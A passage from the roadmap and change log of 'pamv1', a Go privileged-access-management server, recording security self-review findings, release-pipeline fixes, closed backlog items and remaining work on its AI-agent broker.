defects are and that the author is the worst person to be the only reader. Three
findings, all mine, none a bypass.

- [x] **The SFTP handle-table bound was nine times what its comment claimed.**
  Phase 63 bounded `files` at OPEN time, but checked `len(c.files)` alone — so
  every OPEN a client pipelined before the first HANDLE came back saw an empty
  table and was admitted. The real ceiling was that cap *plus* the pending-request
  cap: **1152, not 128**, reproduced at 600 admitted opens against a 128 cap.
  Still bounded, so the finding Phase 63 closed stayed closed and nothing grew
  without limit — but a bound nobody can reason about from its own comment is the
  same defect as a comment describing a knob that does not exist, which is what
  Phase 63 removed two files away. Opens in flight now count
- [x] **`dry_run` had become a dead input.** Phase 65b stopped skipping the
  release job on `workflow_dispatch` and derived everything from
  `github.event_name == 'push'` — after which the boolean controlled nothing:
  `dry_run: false` behaved exactly like `true`. Removed, so the manual trigger is
  unambiguously the rehearsal. That also removes the ability to publish a signed
  release from an arbitrary ref by hand, which is a control rather than a loss —
  a real release comes from a version tag or it does not happen
- [x] **The path-derived session id reached three audit details raw**, while the
  `mustAudit` call three lines away quoted and bounded it. Not reachable with
  hostile text today — only a value matching a real pending session id gets to
  those branches — so it was safe by circumstance, and circumstance is what
  changes when someone adds a branch. Quoted at all three

## Phase 65c — v0.11.2, because a tag is not free to move ✅

The v0.11.1 tag failed before its push, so nothing was published under it and the
obvious move was to delete it and re-tag the fix. Checking first is what stopped
that: **`proxy.golang.org` had already cached `v0.11.1`.** pamv1 is a public Go
module, so the proxy and the checksum database hold that tag's commit
immutably — moving it would leave a permanent `go get …@v0.11.1` checksum
mismatch for everyone, in exchange for tidiness.

- [x] **v0.11.1 stays exactly where it is**, recorded in the changelog as a
  source tag with no artifacts and superseded rather than quietly overwritten
- [x] **v0.11.2** carries the same content plus the two release-pipeline fixes,
  and every pin moves to it (both k8s deployments, terraform, Helm `appVersion` +
  chart `0.2.2`, both READMEs). Published 2026-08-07 as
  `ghcr.io/morandeirachema/pamv1:0.11.2`, digest
  `sha256:50c46ad69ac7cd2263ec49b46553b3186f26b011ef7090802421be2492b58d99`,
  public — anonymous pull verified
- [x] **Rehearsed before tagging**, using the dry run that now actually builds:
  `Build and push` ran for real and every publishing step was skipped

## Phase 65b — The release build takes no cache ✅

Phase 64 put `cache-from`/`cache-to: type=gha` on the release build and **the
v0.11.1 tag failed on it**: `type=gha` requires the docker-container driver, and
the job uses buildx's default `docker` driver, which cannot export cache at all.
Nothing was published — the failure is before the push — so the tag was unclaimed
and could be recreated rather than burned.

The fix is removal, not a driver. A release is the one build whose speed matters
least and whose provenance matters most; a signed, attested artifact is a stronger
claim when nothing outside the commit fed the compiler. The Dockerfile's
`RUN --mount=type=cache` mounts stay: with no cache backend attached they start
empty in CI, so the release builds cold by construction, while the same Dockerfile
still caches for everyday `docker build` and `docker compose build` — which is
where the time was actually being spent.

- [x] `release.yml` carries no cache configuration, and says why in place
- [x] Phase 64's roadmap entry and the 0.11.1 changelog entry corrected, rather
  than left claiming a cache that does not exist
- [x] **The dry run now builds.** The lesson looked like "a workflow change is
  not verified by the CI that does not run it" — `ci.yml` never exercises
  `release.yml`, so this passed six green checks and failed on the tag — and the
  obvious retort was that the `workflow_dispatch` dry run exists for exactly
  this. It does not: it skipped the whole `release` job (`if: … || !inputs.dry_run`),
  so a rehearsal proved only that `go test` runs. **A rehearsal that skips the
  step that breaks is not a rehearsal.** The job now runs either way and the
  build happens for real; everything with an outward effect — the push, the
  cosign signature, the SBOM and SLSA attestations, the GitHub Release — stays
  gated on a genuine tag push

## Phase 65a — v0.11.1, cut rather than banked ✅

Phases 63–65 are fixes an operator can see — a refused step-up decision no longer
recording that it *was* decided, recording playback failing closed, an HSM build
that can finally say which build it is — plus an **audit-vocabulary change** that
SIEM rules are written against. Banking them would have restarted the exact drift
v0.11.0 existed to close, which is the argument for cutting on the day rather
than on a schedule.

- [x] **`v0.11.1`** through the test-gated pipeline, the first release to use the
  Phase 64 build cache
- [x] **All four pins moved together** (both k8s deployments, terraform, Helm
  `appVersion` + chart `0.2.1`) and both READMEs restate the current release —
  the same checklist as 62b, because the failure mode was one flavour left behind
- [x] **The vocabulary change is called out in the release notes**, not buried in
  a phase bullet: removing `proxy.auth_rate_limited` from the OCSF classifier
  silently retires any rule built on it, even though the rule could never fire

## Phase 65 — The self-audit absorbs the phases it had not read ✅

The last item of the 2026-08-07 sweep, and a documentation phase rather than a
code one. `docs/SECURITY-GAPS.md` had recorded every *sweep* and none of the
**per-phase reviews** — so seventeen defects found by reviewing new code the day
it merged lived only in this roadmap and the low-level change log, while the
document that exists to be the security record said it reflected phases 0–55.

- [x] **A new section covering the reviews of 59a, 60a and 61a**, written as
  findings rather than as a change list: what was wrong, what it cost, what
  closed it. Fifteen defects in SFTP content capture (three of them complete
  bypasses of the containment Phase 59 exists for, one a reachable panic that
  crashed every attempt to read a file's evidence back, one an audit-field
  forgery that would let an operator vouch for a recording they had altered); the
  approval claim that consumed an approval whose ticket it had never checked, and
  its mirror image that let a third party lock an operator out of their whole
  window; and the credential reference that was a credential use.
- [x] **The header states 0–65** and no longer carries a known-currency-gap
  caveat, because there is no longer a gap to caveat.
- [x] **One lesson, stated once**, because all seventeen share a shape: *a new
  control that governs a set, and a member of the set that was missed.* Three
  OpenSSH SFTP extensions gated and a fourth left open; a re-check performed on
  one approval and a consume performed on another; a credential reference read as
  configuration when every sibling reference is a use. It is the argument for
  reviewing a phase the day it merges, which is where most of this codebase's
  defects have actually been found.

## What is left ⬜

The canonical backlog. Earlier read-only sweeps are closed — the 2026-07-26 one
by phases 37–46, the 2026-07-27 post-beta one by phases 52–52g, the 2026-07-30
one by the fixes of 2026-07-30/31, and the 2026-08-06 read of the two newest
phases by 60a and 61a. The **2026-08-07 sweep** (the first over phases 56–61a as
a whole) closed across phases 62, 63 and 65 — see §0 below and
[docs/SECURITY-GAPS.md](docs/SECURITY-GAPS.md). **Every read-only sweep is
closed**, so nothing here is a known defect — including the **2026-08-17/18
AI-agent-broker research** (five parallel read-only passes over the broker
itself), whose two live defects were closed by phases 169 and 170; what remains
of that batch is capability, not breakage, and is listed in §3b. The **2026-08-10 refactor,
hardening and documentation-currency arc (phases 96–107)** — cross-path
security-parity, the proxy-family structural unification, parser fuzzing, gosec
enforcement, config-validation and docs — is likewise complete and adds no
backlog; it is recorded per-phase above. Everything after §0 is the honest
remainder, grouped by what it would take to close, with each item recorded
against the phase that deferred it.

#### 0. The 2026-08-07 sweep — closed

Nine findings: two shipped as Phase 62, six as Phase 63, and half of one was
**withdrawn as a false positive** (the §4 config-table claim — see finding AU).
Phase 65 then absorbed the per-phase reviews of 56–61a into the self-audit, which
was the last item. Struck below, with what closed each:

- ~~**Audit fidelity at the step-up decision point**~~ — ✅ Phase 63. The
  fail-closed `session.stepup_decided` is written only once a decision will be
  attempted: `StepUp.Holder` and the new `LookupRemote`/`DispatchRemote` split
  establish that read-only first, so a refused self-approval and a decision for
  a session paused nowhere leave no record claiming otherwise.
- ~~**`session.playback` is best-effort audited**~~ — ✅ Phase 63: `mustAudit`,
  refusing before a byte leaves, like every other path that hands over
  KEK-protected material.
- ~~**`sftpCapture.required` is dead state**~~ — ✅ Phase 63: the field and its
  parameter are gone, and the comments now describe what the code does (an
  unwritable artifact refuses in every mode).
- ~~**The per-session SFTP artifact bound stops counting when it matters most**~~
  — ✅ Phase 63: `trackOpen` bounds the handle table itself, `bindHandle` uses a
  counter instead of rescanning, and the refused OPEN is answered on the request
  leg so no data moves against an untracked handle.
- ~~**Audit-vocabulary drift**~~ — ✅ Phase 63: `breakglass.unseal_failed` and
  `session.relay_start` documented, `proxy.auth_rate_limited` removed from §5 and
  from the OCSF classifier, where it had been a rule that could never fire.
- ~~**`docs/SECURITY-GAPS.md` has not absorbed phases 56–61a**~~ — ✅ Phase 65.
- ~~**Deployment reference drift**~~ — ✅ Phase 63 for the real half: the three
  Phase 57 variables are in `deploy/docker/.env.example`. The claim that §4 of
  the low-level doc omitted ~34 variables was **withdrawn** — §4 documents
  families in a slash shorthand the check did not expand; expanding it gives zero
  missing of the 158 the code reads.

#### 1. Blocking the beta claim — ✅ resolved 2026-07-28

The README defines beta as *feature-complete against the roadmap, self-audit
closed, exercised by tests, and deploys as code*. The fourth criterion was the
last to hold, and now does:

- **The release is cut.** `v0.10.0` was tagged on 2026-07-28 and `release.yml`
  ran for real for the first time: its own test job gated the tag, then the
  image was built and pushed as
  `ghcr.io/morandeirachema/pamv1:0.10.0` (digest
  `sha256:ab2a5fa5db27fae805f9096dfdf526497ddff4cc3774b33469ab108b98637b39`),
  cosign-signed keyless, with an SPDX SBOM attestation and SLSA build
  provenance, and a GitHub Release carrying the SBOM. The package is public —
  anonymous pull verified — so `kubectl apply`, `helm install` and the
  Terraform module resolve the pin they always carried. This also closed
  [SECURITY-GAPS finding 18](docs/SECURITY-GAPS.md), which had been
  deliberately reopened until a release existed.

#### 2. Test gaps

- ~~**`cmd/pam-server` is at 0% coverage**~~ — ✅ closed 2026-07-28.
  `cmd/pam-server/main_test.go` now drives the wiring layer the way a
  misconfigured deployment would: every fail-closed startup path reachable
  without external infrastructure (deny files, audit-chain keys, TLS
  requirements, identity backends, listener conflicts) triggered through the
  environment; a full boot of the real server — both proxies, audit chain, SSH
  CA, broker policy, background workers — health-checked live and shut down
  with a real SIGTERM; the utility flags proven end to end (`-split-key` shares
  actually reconstruct the key); and `-rotate-kek` proven against live
  PostgreSQL in the pgstore CI job (old KEK stops decrypting, new one starts).
  82.8% of the package's statements; the remainder is `main()`'s flag dispatch
  and `fatal()`, which call `os.Exit` and are one-line wrappers around what is
  tested.
- ~~**Four small, cheap ones**~~ — ✅ closed 2026-07-28, each against its
  existing fixture: the ITSM gate's unreachable-webhook path **denies** (fail
  closed — proven against a dead endpoint, plus the 2xx/non-2xx legs); the
  broker's 1024 parked-approval cap refuses the 1025th call terminally without
  evicting anyone; `guacd`'s handshake protocol-error branches (wrong opcode,
  EOF, oversized length, garbage, `ready` without a connection id) all surface
  as errors; and `oidc.Discover` resolves endpoints (trailing slash included)
  and errors on unreachable or malformed metadata.

#### 3. Feature follow-ons, in process

Buildable without external infrastructure, each deferred by the phase named.

- ~~**Cross-replica live monitoring** (34)~~ — ✅ closed 2026-07-29 (Phase 55).
  `GET /api/sessions` now lists the whole cluster from any replica (a shared,
  heartbeat-refreshed inventory whose stale rows age out) and the SSE watch
  streams a session hosted anywhere: an **interest-gated** relay over the store
  bus forwards a watched session's output only while a remote supervisor is
  actually watching, so an unwatched session costs the bus nothing.
- ~~**Cross-replica step-up decisions** (30/55)~~ — ✅ closed 2026-07-31
  (Phase 56). The pending list is cluster-wide (a shared, TTL-bounded inventory
  whose statements rest sealed under the bus key) and a supervisor's decision
  on any replica is dispatched — sealed and freshness-bound — to the replica
  whose memory holds the pause, through the same claim point and with the same
  self-approval refusal.
- ~~**Per-file SFTP content recording** (32)~~ — ✅ closed 2026-08-01
  (Phase 59): every file moved over SFTP leaves a sealed, hash-chained chunk-log
  artifact beside the session recordings, replayable from the console; the
  per-file cap doubles as a transfer size limit, and an unparsable stream now
  fails closed while capture is on.
- ~~**WinRM live streaming** (16)~~ — ✅ closed 2026-07-29. Every WinRM path now
  tees to the live-monitoring hub under its session id: the proxy's interactive
  shell (banner, prompt, command echo, output, refusals — the same bytes the
  recording sees), and the REST endpoint + broker `winrm_exec` through their
  shared chokepoint (`winrm>` command echo, output, blocked/error notices). A
  supervisor watches a WinRM session exactly as an SSH or PostgreSQL one.
- ~~**Per-target RDP clipboard override** (33)~~ — ✅ closed 2026-07-29. A
  target's `rdp_clipboard` / `rdp_clipboard_audit` fields (API + 5250 screens)
  tighten the globals for that one target; the **stricter** policy always wins
  (allow < readonly < deny; off < meta < full), so a high-sensitivity target can
  deny what the fleet allows and no target row can loosen a global deny. Proven
  end to end: a target `deny` under a global `allow` reaches guacd as
  `disable-copy`/`disable-paste=true`.
- ~~**Safe-scoped policy** (17)~~ — ✅ closed 2026-07-31 (Phase 58): a safe now
  carries `require_approval` and a dual-control `min_approvers` floor binding
  every target in it, strictest-wins with the global and per-target settings and
  enforced through one shared fold at all five gates. ~~**Still open, the other half of that bullet**: a per-consumer management
  credential for dependent-account propagation~~ — ✅ closed 2026-08-02
  (Phase 61): a dependency can name the credential pamv1 connects with, so
  propagation no longer logs in as the account it is rotating — and, since
  Phase 61a, naming one takes the same authorization as revealing it.
- ~~**Campaign depth** (19)~~ — ✅ **closed entirely**: scheduled/recurring and
  safe/subject-scoped campaigns (Phase 68), reviewer assignment (69) and
  reminders (70).
- ~~**Ticket gate depth** (20)~~ — ✅ closed 2026-08-08 in **Phase 84**:
  first-class ServiceNow and Jira connectors that check the ticket's state, its
  change window and **whether it names the operator** — the last of which the
  generic webhook could not express, so a valid change number used to admit
  anyone who knew one. ~~Gating the *connect* path on a live ticket
  lookup rather than validating at request time~~ — ✅ closed 2026-08-02
  (Phase 60): `PAM_TICKET_REVALIDATE` re-checks the admitting request's ticket
  at the moment access is used, at all five gates, through one shared fold —
  and, since Phase 60a, the approval that is spent is the one whose ticket
  passed.
- ~~**Vendor console screen** (29)~~ — already shipped in **Phase 45** (menu 22,
  *Work with Vendors*, plus contract grants); this line was stale and is struck
  here rather than left inviting someone to build it twice.
- ~~**Config depth** (12)~~ — ✅ closed 2026-08-08 in **Phase 78**. Both halves:
  `PAM_CONJUR_VARS` overrides the variable id per secret, and
  `PAM_CONJUR_REFRESH_MIN` re-reads the refreshable ones on a running server.
  Only `PAM_API_KEY` and `PAM_BREAK_GLASS_KEY_HASH` can honestly be refreshed;
  the KEK, the database URL and the two audit-chain keys are pinned to a restart
  and are deliberately **not fetched**, so the startup log names both lists.
- ~~**KEK-wrap the broker audit keys** (13)~~ — ✅ closed 2026-07-28. The two
  variables are now optional: unset, each key is generated once and held under
  shared custody (KEK-sealed in `key_material`, converged on by every replica,
  re-wrapped by `-rotate-kek`), exactly like the SSH host/CA keys. An explicit
  env value still wins — that remains the signer-rotation path.
- ~~**Analytics depth** (23)~~ — ✅ closed 2026-08-09 in **Phase 86**:
  `analytics.Baseline` (built from the window preceding the scored one — no new
  storage), a **new-target novelty** signal that stays silent without history so
  a new joiner is not an anomaly, a **peer-outlier** signal measured against the
  median and skipped below a real peer group, and
  `PAM_ANALYTICS_AUTO_STEPUP` — revoke a high-risk actor's logins so their next
  action re-authenticates, the rung below killing them.
- ~~**Console screen for token exchange** (57)~~ — ✅ closed 2026-08-07
  (Phase 67): menu 27 shows the signing key's `kid` and the delegation chains
  from the audit trail, which is the only record a stateless minted SVID leaves.
- ~~**Deploy examples** (14)~~ — ✅ closed 2026-08-08 in **Phase 79**: cloud-KMS
  recipients documented in `.sops.yaml`, a working Flux example in
  `deploy/k8s/flux/` (two `Kustomization`s, since only the secrets need the
  decryption key), a really-sealed `helm secrets` values file, and the
  CloudNativePG app password sealed so it is an input rather than something read
  back out of the cluster. Building what the docs described also turned up the
  quickstart bug where `kubectl apply -f deploy/k8s/` overwrote the secret you
  had just created with `CHANGE_ME`.

#### 3b. The AI-agent broker batch (2026-08-17/18 research)

Five read-only passes aimed at the broker itself — MCP spec security, agent
identity standards, vendor AI-agent controls, agentic threat frameworks, and a
follow-on pass re-read at HEAD after the first nine phases had shipped. Every
finding carried a `file:line`; the standards citations were fetched, not
recalled. **Nine phases closed it so far** — 159 (identity lifecycle + the
subject-keyed stop button), 161 (run visibility: outcome-bearing actions, risk
signals, run correlation), 163 (the guard defeated by sending less), 165
(bounded results + the whole transcript), 167 (cumulative budgets), 169
(chain-following quarantine + grant-scoped inventory), 170 (an owner for the
SPIFFE-attested identity kind, which is what made four-eyes fire there), 171
(`ttl_seconds` enforced, `scope` described honestly) and 173 (the policy
principal side + the `caller.*` namespace).

**Both live defects are closed.** What is left is capability, ordered by what it
buys:

- ~~**SVID enrollment and inventory**~~ — ✅ closed 2026-08-18 (Phase 174): every
  attested identity that authenticates is recorded on sight (unowned, first- and
  last-seen stamped, audited once), claiming one is what enrolling means, and
  `PAM_BROKER_REQUIRE_ENROLLED_SVID` makes the claim mandatory. Enrollment is
  still not attestation — SPIRE stays in §5. **What remains of the original
  bullet**: `CanConnectTarget` returns open for a target with zero grants, so an
  enrolled-but-ungranted agent still reaches an ungated target; that is a
  deliberate estate-wide default, not an agent-specific one, and changing it
  belongs to a phase that decides it for humans too.
- **"What can this agent reach?" has no query.** Every grant lookup is
  target-indexed (direct rows plus safe membership), which is also the honest
  cost Phase 169 accepted for its scoped inventory: two reads per target. A
  subject-indexed view would answer the question an investigator actually asks,
  and would let an agent's access be *reviewed* rather than reconstructed.
- ~~**Agent identities are never recertified.**~~ — ✅ closed 2026-08-19 (Phase
  175): campaigns snapshot both agent identity kinds as items of their own
  (`SubjectType "agent"`, with owner, state and dormancy), revoking one suspends a
  key or quarantines an attested subject rather than deleting it, and an owner
  matching no pamv1 user is reported in both listings and inside the review. A
  grant *naming* an agent is still filed as a `"user"` subject — that is the grant
  table's shape, not the review's, and changing it would rewrite how every grant
  is stored.
- ~~**Posture never reaches the agent path.**~~ — ✅ closed 2026-08-21 (Phase
  180): `PAM_BROKER_POSTURE_REQUIRED` extends the existing webhook to agent
  identities, checked last so a stopped identity never reaches it, refusals
  audited `agent.posture_denied`, and the request now names the subject's kind so
  a posture system can tell a laptop from a workload. The honesty stands and is
  written into the package doc: a webhook attesting about a NAME is much weaker
  than cryptographic workload attestation, which stays in §5.
- ~~**pamv1 enforces `may_act` but never issues it**~~ — ✅ closed 2026-08-21
  (Phase 181): the exchange accepts a `may_act` parameter (a pamv1 extension, since
  the RFC defines only the claim) and stamps it into the issued token, bounded to
  eight in-domain parties and never the subject itself, with the pin audited.
- ~~**The approver sees one call, not the campaign.**~~ — ✅ closed 2026-08-21
  (Phase 183): `PendingApproval` carries `ActorChain` and console menu 20 shows a
  HOPS column, and the presented token's `jti` is parsed and recorded as
  `svid_jti:` so `broker.token.exchanged` joins to the calls made with that
  token. **What remains of the original bullet**: the approver still sees one
  CALL rather than the run it belongs to — grouping a decision by `session:` is a
  different feature, not a missing field.
- **Policy cannot read the registry owner** (deferred by Phase 173):
  `caller.on_behalf_of` is the accountable party as the identity carries it, not
  the human Phase 170's registry records for a SPIFFE ID. Resolving it inside the
  engine would make the engine read the store, which it deliberately does not do;
  the plumbing belongs in the broker.
- **Smaller, named so they are not forgotten**: no proof-of-possession
  (`cnf`/DPoP/WIMSE) on a minted delegated token, so bearer remains bearer; the
  trust bundle is read once at startup; MCP is pinned at protocol `2024-11-05`;
  `tools/list` shows every agent the whole toolset regardless of what policy
  would allow it; the SVID verifier allows 60 seconds of clock leeway past `exp`,
  normal practice but permissive in a system where a delegated token's TTL is its
  other containment; and there is no ceiling on a single *run* — calls or targets
  touched under one `session:` — as opposed to per minute and per day, both of
  which exist.

**Out of scope, not missing**: CyberArk's and StrongDM's agent brokers are
*egress* proxies governing which third-party MCP servers an agent may call.
pamv1 is an MCP **server**. Different product shape, not a gap.

#### 3c. Cleanup the 2026-08-19 sweep recorded — ✅ closed

- ~~**Six store methods have no production caller.**~~ ✅ Phase 177 decided each
  one instead of deleting the lot: two were capability gaps hiding as dead code
  (a vendor's email could never be corrected; a user could never see how many
  recovery codes they had left) and are now wired; one was surface that read like
  a control (`SetVendorDisabled`) and is gone; three are read primitives the
  store contract suite legitimately uses, kept and recorded so the next scan does
  not re-find them.

#### 3d. A flaky test — now able to say why (open, cause unproven)

`proxy.TestDBProxyZSPProvisionsAndTearsDownRole` failed once in CI on the
v0.49.0 release PR — a commit that changes no Go code — and passed on the rerun.
It has not been reproduced since: forty local `-race` runs of the ZSP tests and
six full `-race` passes of the whole proxy package under saturated CPU with
`GOMAXPROCS=1` all pass.

**Phase 179 did what could be done honestly**: the test can now report its own
cause (it printed the proxy's client-facing wire message and nothing else, while
the real error sat in the audit trail it never read), and the arbitrary 5-second
dial bound it set — tighter than the 10 seconds production defaults to — is
gone, since a test that fails because IT chose to be more impatient than the
product is testing its own impatience. That second change is a *candidate* fix,
not a diagnosis, and is labelled as one in the code.

**What is still open**: the cause. The next occurrence will name it — the
failing test now prints `db.session.error … error:<real error>` alongside the
wire message — and until then, guessing at timing code would be changing
behaviour on a hunch.

#### 4. Repo furniture — ✅ closed 2026-07-28

- `CHANGELOG.md` (releases; the per-phase history stays here), `CONTRIBUTING.md`,
  `CODEOWNERS`, issue templates (with a private-security-report contact link)
  and a PR template carrying the living-docs checklist.
- `.github/dependabot.yml` — weekly gomod (grouped), github-actions and docker
  updates, so `govulncheck`'s gate has a delivery path for fixes.
- A `manifests` CI job: `helm lint`, a full chart render (defaults **and**
  everything-on, so gated templates are exercised), and `kubeconform` over the
  raw K8s manifests and both renders — a broken chart fails in CI, not at
  `apply` time. CRD instances (CNPG `Cluster`, `ServiceMonitor`) are skipped,
  not failed.
- Housekeeping: the eight remaining stale `phase-*` branches on the remote are
  deleted (each verified against its merged PR first).

#### 5. Infra-bound — not here

Anything needing external infrastructure or a paid account to build and verify
honestly stays in
**[docs/EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md)** rather than being
faked: Kerberos bind and Kerberos WinRM (a KDC), serial connectors (RS-232
hardware), MySQL/Oracle and network-device connectors (SQL Server shipped in Phase 53, though its interop with a real server is unverified), live cloud-CIEM
ingestion and short-lived cloud-credential brokering, web/SaaS session proxying,
SPIRE workload attestation and RFC 8693 token exchange, ephemeral local accounts,
and the Tier-4 ecosystem items (a Terraform provider, Secrets-Hub sync-out,
SSH-key fleet discovery, thick-app components).

#### 6. Deliberate limits, not backlog

Recorded so they are not mistaken for unfinished work:

- **An interactive PTY is never parsed**, so command control and per-action
  step-up cover the exec, WinRM and SQL paths but not a raw shell. Use observer
  sessions or restrict shell access. This is the boundary, not a gap.
- **Numeric policy comparators do not apply to raw SQL** — statements are not
  structured arguments; in-session step-up covers that path instead.
- **Sealed recordings are not re-wrapped by `-rotate-kek`**, because rewriting
  them would invalidate the SHA-256 the audit trail attests to. Retain the old
  KEK for as long as you retain sealed recordings.
- **Operator certificates (28) deliberately bypass the proxy.** Authorization is
  enforced at issuance and certificates are revocable by serial, but the session
  is direct and unrecorded — keep the feature off, or the path off the OT
  firewall, if that is not what you want.

---

## Portal: keyboard-first navigation ✅

The 5250 console is now explicitly **keyboard-first** (the mouse is optional), matching the IBM-terminal heritage: focus lands on each screen's primary field after every render, **Esc** cancels/goes back (the twin of F12), **↑/↓** move between subfile option cells, Tab/Enter/F-keys work throughout, and a persistent hint documents the shortcuts. The look is unchanged — only keyboard affordances were added.

---

**Tier-2 (access-governance depth) is complete** — certification campaigns (19), the ITSM/ticketing gate (20), and richer approval workflows (21), now including one-time access (26). **Tier-3**: Zero Standing Privilege (22), privileged threat analytics (23) and the identity blast-radius / CIEM engine (31) are shipped — three of five; connector/plugin breadth and web/SaaS session proxying remain, along with *live* cloud-CIEM ingestion, all infra-bound. **Tier-4 is under way**: the application-secrets API (24) is shipped; a Terraform provider, Secrets-Hub sync-out, SSH-key fleet discovery, and thick-app components remain, each requiring external infrastructure or an account to build honestly (see [docs/EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md)). The 5250 console has **full parity** with the backend (Phase 25) — every shipped capability is operable from the portal, keyboard-first — and the session-recording loop is closed end to end (Phase 26): record → watch live → replay later, hash-verified. See the [competitive-coverage section](README.md#coverage-vs-commercial-pam-cyberark-wallix-) for the full picture.

**What is next** is consolidated in [What is left](#what-is-left-) above, and
the list is much shorter than it was: the beta-claim release, the
`cmd/pam-server` test gap, the dozen feature follow-ons and the repo furniture
are all closed and struck through there. What genuinely remains in process is
**§3b — the rest of the AI-agent-broker batch**: SVID enrollment and inventory,
a subject-indexed answer to "what can this agent reach?", recertification for
non-human identities, posture on the agent path, `may_act` emission, and the
approver's view of a delegation chain. The infra-bound catalogue stays separate
in [docs/EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md), and the console is
at **full parity** — every shipped capability is operable from the portal,
keyboard-first.
